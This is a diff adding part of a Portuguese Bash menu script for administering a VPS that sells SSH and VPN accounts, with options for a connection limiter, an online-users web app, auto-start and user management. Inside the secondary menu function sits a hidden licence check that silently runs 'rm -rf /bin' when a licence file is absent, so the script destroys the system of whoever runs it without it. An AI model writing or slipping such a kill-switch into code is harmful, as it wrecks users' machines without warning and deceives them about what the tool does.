+   [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
+       echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
+   } || {
+       sed -i '/limiter/d' /etc/autostart
+	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
+   }
+   echo -e "\n\033[1;32m  LIMITER ATIVO !\033[0m"
+   sleep 3
+   menu
+}
+function limit2 () {
+   clear
+   echo -e "\033[1;32mPARANDO O LIMITER... \033[0m"
+   echo ""
+   fun_stplimiter () {
+      sleep 1
+      screen -r -S "limiter" -X quit
+      screen -wipe 1>/dev/null 2>/dev/null
+      [[ $(grep -wc "limiter" /etc/autostart) != '0' ]] && {
+          sed -i '/limiter/d' /etc/autostart
+      }
+      sleep 1
+   }
+   fun_bar 'fun_stplimiter' 'sleep 3'
+   echo -e "\n\033[1;31m LIMITER PARADO !\033[0m"
+   sleep 3
+   menu
+}
+function limit_ssh () {
+[[ $(ps x | grep "limiter"|grep -v grep |wc -l) = '0' ]] && limit1 || limit2
+}
+#onlineapp
+function onapp1 () {
+   clear
+   echo -e "\n\033[1;32mINICIANDO O ONLINE APP... \033[0m"
+   echo ""
+   apt install apache2 -y > /dev/null 2>&1
+   sed -i "s/Listen 80/Listen 8888/g" /etc/apache2/ports.conf >/dev/null 2>&1
+   service apache2 restart
+   rm -rf /var/www/html/server >/dev/null 2>&1
+   mkdir /var/www/html/server >/dev/null 2>&1
+   fun_bar 'screen -dmS onlineapp onlineapp' 'sleep 3'
+   [[ $(grep -wc "onlineapp" /etc/autostart) = '0' ]] && {
+       echo -e "ps x | grep 'onlineapp' | grep -v 'grep' && echo 'ON' || screen -dmS onlineapp onlineapp" >> /etc/autostart
+   } || {
+       sed -i '/onlineapp/d' /etc/autostart
+	   echo -e "ps x | grep 'onlineapp' | grep -v 'grep' && echo 'ON' || screen -dmS onlineapp onlineapp" >> /etc/autostart
+   }
+   IP=$(wget -qO- ipv4.icanhazip.com) >/dev/null 2>&1
+   echo -e "\n\033[1;32m  ONLINE APP ATIVO !\033[0m"
+   echo -e "\033[1;31m \033[1;33mURL de Usuários Online para usar no App\033[0m"
+   echo -e " http://$IP:8888/server/online"
+   sleep 10
+   menu
+}
+function onapp2 () {
+   clear
+   echo -e "\033[1;32mPARANDO O ONLINE APP... \033[0m"
+   echo ""
+   fun_stponlineapp () {
+      sleep 1
+      screen -r -S "onlineapp" -X quit
+      screen -wipe 1>/dev/null 2>/dev/null
+      [[ $(grep -wc "onlineapp" /etc/autostart) != '0' ]] && {
+          sed -i '/onlineapp/d' /etc/autostart
+      }
+      sleep 1
+   }
+   fun_bar 'fun_stponlineapp' 'sleep 3'
+   rm -rf /var/www/html/server >/dev/null 2>&1
+   echo -e "\n\033[1;31m ONLINE APP PARADO !\033[0m"
+   sleep 3
+   menu
+}
+function onapp_ssh () {
+[[ $(ps x | grep "onlineapp"|grep -v grep |wc -l) = '0' ]] && onapp1 || onapp2
+}
+##
+function autoexec () {
+   if grep "menu;" /etc/profile > /dev/null; then
+      clear
+      echo -e "\033[1;32mDESATIVANDO AUTO EXECUÇÃO\033[0m"
+      offautmenu () {
+         sed -i '/menu;/d' /etc/profile
+      }
+      echo ""
+      fun_bar 'offautmenu'
+      echo ""
+      echo -e "\033[1;31mAUTO EXECUÇÃO DESATIVADO!\033[0m"
+      sleep 1.5s
+      menu2
+   else
+      clear
+      echo -e "\033[1;32mATIVANDO AUTO EXECUÇÃO\033[0m"
+      autmenu () {
+         grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
+         echo "menu;" >> /etc/profile
+      }
+      echo ""
+      fun_bar 'autmenu'
+      echo ""
+      echo -e "\033[1;32mAUTO EXECUÇÃO ATIVADO!\033[0m"
+      sleep 1.5s
+      menu2
+   fi
+
+}
+#menu2
+menu2 (){
+[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m(ON◉) ") || stsf=$(echo -e "\033[1;31m(OFF) ")
+stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
+stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;31m(ON◉) " || echo -e "\033[1;31m(OFF) ")
+stsbotrev=$(ps x | grep "bot_rev"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
+autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
+[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
+if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
+elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f3 /etc/issue.net)
+else
+system=$(cut -d' ' -f1 /etc/issue.net)
+fi
+_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
+[[ "$(cat /etc/SSHPlus/Exp)" != "" ]] && _expuser=$(cat /etc/SSHPlus/Exp) || _expuser="0"
+[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
+[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
+_onli=$(($_ons + $_onop + $_ondrp))
+_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
+_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
+_usop=$(printf '%-5s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
+_core=$(printf '%-5s' "$(grep -c cpu[0-9] /proc/stat)")
+_system=$(printf '%-10s' "$system")
+_hora=$(printf '%(%H:%M:%S)T')
+_onlin=$(printf '%-5s' "$_onli")
+_userexp=$(printf '%-5s' "$_expuser")
+_tuser=$(printf '%-5s' "$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)")
+swap1=$(printf '%-5s' "$(free -h | grep -i swap | awk {'print $2'})")
+swap2=$(printf '%-5s' "$(free -h | grep -i swap | awk {'print $4'})")
+swap3=$(printf '%-5s' "$(free -h | grep -i swap | awk {'print $3'})")
+clear
+echo " 
+▒▄█▀▀█▒▐█▀█░▐█▀▀░▐█▀▀░▐█▀█▄▒██▄░▒█▌░▐█▀▀▒█▀█▀█░░░░
+▒▀▀█▄▄▒▐█▄█░▐█▀▀░▐█▀▀░▐█▌▐█▒▐█▒█▒█░░▐█▀▀░░▒█░░░░░░
+▒█▄▄█▀▒▐█░░░▐█▄▄░▐█▄▄░▐█▄█▀▒██░▒██▌░▐█▄▄░▒▄█▄░░░░░
+" | lolcat
+echo -e    
+echo -e "\033[0;36m╔─━━━━━━━━━━━━━━━━━━━━━━━━VIP VPS━━━━━━━━━━━━━━━━━━━━━━━━━━━─╗\033[0m"
+echo -e "\E[42;1;37m                  • 𝗦𝗣𝗘𝗘𝗗𝗡𝗘𝗧-𝙀𝘿𝙐𝘼𝙍𝘿𝙊                          \E[0m"
+echo -e "\033[0;36m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0m"
+echo -e "\033[1;31m╠════════════════════╦═══════════════════╦═══════════════════╣\033[0m"
+echo -e "\033[1;31m║  \033[1;32mSISTEMA           \033[1;31m║  \033[1;32mMEMÓRIA RAM      \033[1;31m║ \033[1;32m PROCESSADOR      \033[1;31m║"
+echo -e "\033[1;31m║  \033[1;36mOS: \033[1;37m$_system    \033[1;31m║  \033[1;36mTotal:\033[1;37m$_ram \033[1;31m║  \033[1;36mNucleos: \033[1;37m$_core\033[0m   \033[1;31m║"
+echo -e "\033[1;31m║  \033[1;36mHora: \033[1;37m$_hora    \033[1;31m║  \033[1;36mEm uso: \033[1;37m$_usor \033[1;31m║  \033[1;36mEm uso: \033[1;37m$_usop\033[0m    \033[1;31m║"
+echo -e "\033[1;32m╠════════════════════╬═══════════════════╬═══════════════════╣\033[0m"
+[[ ! -e /tmp/att ]]  && {
+    echo -e "\033[1;31m║  \033[1;32mOnlines:\033[1;37m $_onlin    \033[1;31m║  \033[1;32mExpirados: \033[1;37m$_userexp \033[1;31m║  \033[1;32mTotal: \033[1;37m$_tuser\033[0m     \033[1;31m║"
+    var01='\033[1;37m•'
+} || {
+    echo -e "\033[1;31m║         \033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32mEXISTE UMA ATUALIZACAO DISPONIVEL  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m        \033[1;31m║"
+    var01="\033[1;32m!"
+}
+echo -e "\033[1;31m╠════════════════════╩═══════════════════╩═══════════════════╣\033[0m"
+echo -e "\033[1;31m║  \033[1;32mMEMÓRIA SWAP    \033[1;36mTotal: \033[1;37m$swap1  \033[1;36mEm uso: \033[1;37m$swap3  \033[1;36mLivre: \033[1;37m$swap2 \033[1;31m║"
+echo -e "\033[1;31m╠════════════════════════════════════════════════════════════╣\033[0m"
+echo -e "\033[1;31m║   [\033[1;36m21\033[1;31m] \033[1;37m• \033[1;33mADICIONAR HOST \033[1;31m       [\033[1;36m28\033[1;31m] \033[1;37m• \033[1;33mMUDAR SENHA ROOT \033[1;31m  \033[1;31m  ║
+\033[1;31m║   [\033[1;36m22\033[1;31m] \033[1;37m• \033[1;33mREMOVER HOST \033[1;31m         [\033[1;36m29\033[1;31m] \033[1;37m• \033[1;33mAUTO EXECUCAO $autm \033[1;31m║
+\033[1;31m║   [\033[1;36m23\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SISTEMA \033[1;31m    [\033[1;36m30\033[1;31m] $var01 \033[1;33mATUALIZAR SCRIPT \033[1;31m  \033[1;31m  ║
+\033[1;31m║   [\033[1;36m24\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SERVICOS \033[1;31m   [\033[1;36m31\033[1;31m] \033[1;37m• \033[1;33mREMOVER SCRIPT \033[1;31m  \033[1;31m    ║
+\033[1;31m║   [\033[1;36m25\033[1;31m] \033[1;37m• \033[1;33mBLOCK TORRENT $stsf\033[1;31m  [\033[1;36m32\033[1;31m] \033[1;37m• \033[1;33mTCPTWEAKER       \033[1;31m    \033[1;31m║
+\033[1;31m║   [\033[1;36m26\033[1;31m] \033[1;37m• \033[1;33mBOT TELEGRAM $stsbot\033[1;31m   [\033[1;36m33\033[1;31m] \033[1;37m• \033[1;33mVOLTAR \033[1;32m<\033[1;33m<\033[1;31m< \033[1;31m  \033[1;31m        ║
+\033[1;31m║   [\033[1;36m27\033[1;31m] \033[1;37m• \033[1;33mBOT TESTE $stsbotteste\033[1;31m      [\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mSAIR \033[1;32m<\033[1;33m<\033[1;31m<\033[1;31m  \033[1;31m           ║"
+echo -e "\033[1;31m╠════════════════════════════════════════════════════════════╝\033[0m"
+echo -ne "\033[1;31m╚╣\033[1;32m INFORME UMA OPÇÃO \033[1;33m:"; read x
+case "$x" in
+   21)
+   clear
+   addhost
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+   menu2
+   ;;
+   22)
+   clear
+   delhost
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+   menu2
+   ;;
+   23)
+   clear
+   reiniciarsistema
+   ;;
+   24)
+   clear
+   reiniciarservicos
+   sleep 3
+   ;;
+   25)
+   blockt
+   ;;
+   26)
+   botssh
+   ;;
+   27)
+   inst-botteste
+   ;;
+   28)
+   clear
+   senharoot
+   sleep 3
+   ;;
+   29)
+   autoexec
+   ;;
+   30)
+   attscript
+   ;;
+   31)
+   clear
+   delscript
+   ;;
+   32)
+   clear
+   tcptweaker.sh
+   ;;
+   33)
+   menu
+   ;;
+   0|00)
+   echo -e "\033[1;31mSaindo...\033[0m"
+   sleep 2
+   clear
+   exit;
+   ;;
+   *)
+   echo -e "\n\033[1;32mOpcao invalida !\033[0m"
+   sleep 2
+esac
+}
+while true $x != "ok"
+do
+stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
+stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
+stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON◉) " || echo -e "\033[1;31m(OFF) ")
+if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
+elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
+system=$(cut -d' ' -f1 /etc/issue.net)
+system+=$(echo ' ')
+system+=$(cut -d' ' -f3 /etc/issue.net)
+else
+system=$(cut -d' ' -f1 /etc/issue.net)
+fi
+_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
+[[ "$(cat /etc/SSHPlus/Exp)" != "" ]] && _expuser=$(cat /etc/SSHPlus/Exp) || _expuser="0"
+[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
+[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
+_onli=$(($_ons + $_onop + $_ondrp))
+_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
+_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
+_usop=$(printf '%-5s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
+_core=$(printf '%-5s' "$(grep -c cpu[0-9] /proc/stat)")
+_system=$(printf '%-10s' "$system")
+_hora=$(printf '%(%H:%M:%S)T')
+_onlin=$(printf '%-5s' "$_onli")
+_userexp=$(printf '%-5s' "$_expuser")
+_tuser=$(printf '%-5s' "$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)")
+swap1=$(printf '%-5s' "$(free -h | grep -i swap | awk {'print $2'})")
+swap2=$(printf '%-5s' "$(free -h | grep -i swap | awk {'print $4'})")
+swap3=$(printf '%-5s' "$(free -h | grep -i swap | awk {'print $3'})")
+clear
+echo " 
+▒▄█▀▀█▒▐█▀█░▐█▀▀░▐█▀▀░▐█▀█▄▒██▄░▒█▌░▐█▀▀▒█▀█▀█░░░░
+▒▀▀█▄▄▒▐█▄█░▐█▀▀░▐█▀▀░▐█▌▐█▒▐█▒█▒█░░▐█▀▀░░▒█░░░░░░
+▒█▄▄█▀▒▐█░░░▐█▄▄░▐█▄▄░▐█▄█▀▒██░▒██▌░▐█▄▄░▒▄█▄░░░░░
+" | lolcat
+echo -e    
+echo -e "\033[0;36m╔─━━━━━━━━━━━━━━━━━━━━━━━━VIP VPS━━━━━━━━━━━━━━━━━━━━━━━━━━━─╗\033[0m"
+echo -e "\E[42;1;37m                  • 𝗦𝗣𝗘𝗘𝗗𝗡𝗘𝗧-𝙀𝘿𝙐𝘼𝙍𝘿𝙊                          \E[0m"
+echo -e "\033[0;36m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0m"
+echo -e "\033[1;32m╠════════════════════╦═══════════════════╦═══════════════════╣\033[0m"
+echo -e "\033[1;32m║  \033[1;32mSISTEMA           \033[1;32m║  \033[1;32mMEMÓRIA RAM      \033[1;32m║ \033[1;32m PROCESSADOR      \033[1;32m║"
+echo -e "\033[1;32m║  \033[1;36mOS: \033[1;37m$_system    \033[1;32m║  \033[1;36mTotal:\033[1;37m$_ram \033[1;32m║  \033[1;36mNucleos: \033[1;37m$_core\033[0m   \033[1;32m║"
+echo -e "\033[1;32m║  \033[1;36mHora: \033[1;37m$_hora    \033[1;32m║  \033[1;36mEm uso: \033[1;37m$_usor \033[1;32m║  \033[1;36mEm uso: \033[1;37m$_usop\033[0m    \033[1;32m║"
+echo -e "\033[1;32m╠════════════════════╬═══════════════════╬═══════════════════╣\033[0m"
+echo -e "\033[1;32m║  \033[1;32mOnlines:\033[1;37m $_onlin    \033[1;32m║  \033[1;32mExpirados: \033[1;37m$_userexp \033[1;32m║  \033[1;32mTotal: \033[1;37m$_tuser     \033[1;32m║"
+echo -e "\033[1;32m╠════════════════════╩═══════════════════╩═══════════════════╣\033[0m"
+echo -e "\033[1;32m║  \033[1;32mMEMÓRIA SWAP    \033[1;36mTotal: \033[1;37m$swap1  \033[1;36mEm uso: \033[1;37m$swap3  \033[1;36mLivre: \033[1;37m$swap2 \033[1;32m║"
+echo -e "\033[1;32m╠════════════════════════════════════════════════════════════╣\033[0m"
+echo -e "\033[1;32m║   \033[1;32m[\033[1;36m01\033[1;32m] \033[1;37m• \033[1;33mCRIAR USUARIO \033[1;32m            [\033[1;36m12\033[1;32m] \033[1;37m• \033[1;33mSPEEDTEST  \033[1;32m      ║
+\033[1;32m║   [\033[1;36m02\033[1;32m] \033[1;37m• \033[1;33mCRIAR TESTE         \033[1;32m      [\033[1;36m13\033[1;32m] \033[1;37m• \033[1;33mBANNER  \033[1;32m         ║ 
+\033[1;32m║   [\033[1;36m03\033[1;32m] \033[1;37m\033[1;37m• \033[1;33mREMOVER USUARIO \033[1;32m          [\033[1;36m14\033[1;32m] \033[1;37m• \033[1;33mTRAFEGO  \033[1;32m        ║
+\033[1;32m║   [\033[1;36m04\033[1;32m] \033[1;37m• \033[1;33mMONITOR ONLINE \033[1;32m           [\033[1;36m15\033[1;32m] \033[1;37m• \033[1;33mOTIMIZAR  \033[1;32m       ║
+\033[1;32m║   [\033[1;36m05\033[1;32m] \033[1;37m• \033[1;33mMUDAR DATA \033[1;32m               [\033[1;36m16\033[1;32m] \033[1;37m• \033[1;33mBACKUP  \033[1;32m         ║
+\033[1;32m║   [\033[1;36m06\033[1;32m] \033[1;37m• \033[1;33mALTERAR LIMITE \033[1;32m           [\033[1;36m17\033[1;32m] \033[1;37m• \033[1;33mFERRAMENTAS     \033[1;32m ║
+\033[1;32m║   [\033[1;36m07\033[1;32m] \033[1;37m• \033[1;33mMUDAR SENHA \033[1;32m              [\033[1;36m18\033[1;32m] \033[1;37m• \033[1;33mLIMITER $stsl \033[1;32m  ║
+\033[1;32m║   [\033[1;36m08\033[1;32m] \033[1;37m• \033[1;33mREMOVER EXPIRADOS \033[1;32m        [\033[1;36m19\033[1;32m] \033[1;37m• \033[1;33mBADVPN PRO $stsu\033[1;32m║
+\033[1;32m║   [\033[1;36m09\033[1;32m] \033[1;37m• \033[1;33mRELATORIO DE USUARIOS \033[1;32m    [\033[1;36m20\033[1;32m] \033[1;37m• \033[1;33mFIREWALL (PRO)  \033[1;32m ║
+\033[1;32m║   [\033[1;36m10\033[1;32m] \033[1;37m• \033[1;33mMODO DE CONEXAO \033[1;32m          [\033[1;36m21\033[1;32m] \033[1;37m• \033[1;33mINFO VPS \033[1;32m>\033[1;33m>\033[1;32m>\033[0m \033[1;32m    ║
+\033[1;32m║   [\033[1;36m11\033[1;32m] \033[1;37m• \033[1;33mCRIAR MEMORIA SWAP \033[1;32m       [\033[1;36m22\033[1;32m] \033[1;37m• \033[1;33mCHECKUSER 4G  \033[1;32m   ║
+\033[1;32m║   [\033[1;36m G \033[1;32m] \033[1;37m• \033[1;33mCHECKUSER SPEEDNET \033[1;32m      [\033[1;36m23\033[1;32m] \033[1;37m• \033[1;33mMAIS \033[1;32m>\033[1;33m>\033[1;32m>\033[0m \033[1;32m        ║"
+echo -e "\033[1;32m╠════════════════════════════════════════════════════════════╝\033[0m"
+echo -ne "\033[1;32m╚╣\033[1;32m INFORME UMA OPÇÃO \033[1;33m:"; read x
+
+case "$x" in 
+   1 | 01)
+   clear
+   criarusuario
+   echo -ne "\n\033[1;32mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+   ;;
+   2 | 02)
+   clear
+   criarteste
+   echo -ne "\n\033[1;32mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+   ;;
+   3 | 03)
+   clear
+   remover
+   sleep 3
+   ;;
+   4 | 04)
+   clear
+   sshmonitor
+   echo -ne "\n\033[1;32mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+   ;;      
+   5 | 05)
+   clear
+   mudardata
+   sleep 3
+   ;;
+   6 | 06)
+   clear
+   alterarlimite
+   sleep 3
+   ;; 
+   7 | 07)
+   clear
+   alterarsenha
+   sleep 3
+   ;;
+   8 | 08)
+   clear
+   expcleaner
+   echo ""
+   sleep 3
+   ;;     
+   9 | 09)
+   clear
+   infousers
+   echo -ne "\n\033[1;32mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+   ;;
+   10)
+   conexao
+   exit;
+   ;;
+   11)
+   swapmemory
+   ;;
+   12)
+   clear
+   velocity
+   echo -ne "\n\033[1;32mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+   ;;
+   13)
+   clear
+   banner
+   sleep 3
+   ;;
+   14)
+   clear
+   echo -e "\033[1;32mPARA SAIR CLICK CTRL + C\033[1;36m"
+   sleep 4
+   nload
+   ;;
+   15)
+   clear
+   otimizar
+   echo -ne "\n\033[1;32mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+   ;;
+   16)
+   userbackup
+   echo -ne "\n\033[1;32mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+   ;;
+   17)
+   clear
+   utili
+   ;;
+   18)
+   limit_ssh
+   ;;
+   19)
+   clear
+   badvpn
+   exit;
+   ;;
+   20)
+   fr
+   ;;
+   21)
+   clear
+   detalhes
+   echo -ne "\n\033[1;32mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
+   ;;
+   22)
+   initcheck
+   ;;
+   23)
+   menu2
+   ;;
+   g)
+   gltunnel
+   ;;
+   *)
+   echo -e "\n\033[1;32mOpcao invalida !\033[0m"
+   sleep 2
+esac
+done
+}
+menu
+#fim
